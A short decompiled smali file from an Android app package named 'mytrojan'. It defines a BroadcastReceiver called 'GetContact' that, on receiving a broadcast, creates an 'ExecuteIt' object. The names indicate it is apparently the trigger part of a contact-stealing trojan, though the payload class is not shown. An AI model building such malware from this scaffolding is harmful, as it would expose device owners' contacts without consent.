.class public Lcom/example/mytrojan/GetContact;
.super Landroid/content/BroadcastReceiver;
.source "GetContact.java"


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 8
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    .line 9
    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 4
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 13
    new-instance v0, Lcom/example/mytrojan/ExecuteIt;

    invoke-direct {v0, p1}, Lcom/example/mytrojan/ExecuteIt;-><init>(Landroid/content/Context;)V

    .line 14
    return-void
.end method
